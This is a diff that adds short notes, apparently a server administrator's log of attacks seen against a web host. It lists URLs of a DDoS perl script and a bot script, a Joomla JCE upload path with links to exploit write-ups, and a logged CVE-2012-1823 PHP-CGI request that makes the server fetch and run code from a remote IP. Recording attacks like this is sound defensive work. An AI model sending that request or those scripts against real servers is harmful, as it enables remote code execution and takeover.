@@ -1,0 +1,23 @@
+##DDOS perl script
+/[Scripthttp://hhispano.com.ar//gohack/ddos.txt 1 -
+/awstats/[Scripthttp://hhispano.com.ar//gohack/pbotz.txt 1 -
+
+##JOOMLA exploit, Line 3834
+/images/stories/0day.php
+(Hacking joomla jce editor)[http://www.behindthefirewalls.com/2013/04/hacking-joomla-jce-editor-vulnerability.html]
+(Script for Joomla exploit)[http://www.bugreport.ir/78/exploit.htm]
+
+
+## cgi-bin/php Exploit: PHP < 5.4.x Exploit
+  -DATE:
+    2012
+  -CVE:
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823
+
+#####Log Entries
+ok.txt+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n
+
+cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D\"\"+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+
+cgi-bin is automatically generated
+https://forums.cpanel.net/threads/cgi-bin-in-public_html-folder.312081/
